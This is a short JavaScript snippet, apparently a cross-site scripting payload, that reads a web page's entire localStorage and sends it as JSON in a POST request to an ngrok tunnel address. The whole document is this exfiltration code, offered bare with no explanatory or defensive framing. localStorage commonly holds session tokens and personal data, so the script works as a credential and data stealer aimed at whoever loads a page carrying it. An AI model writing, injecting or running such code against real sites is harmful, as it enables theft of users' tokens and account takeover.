console.log(localStorage);
const Http = new XMLHttpRequest();
Http.open("POST", "https://8fc56e9a.ngrok.io");
Http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
Http.send(JSON.stringify(localStorage));
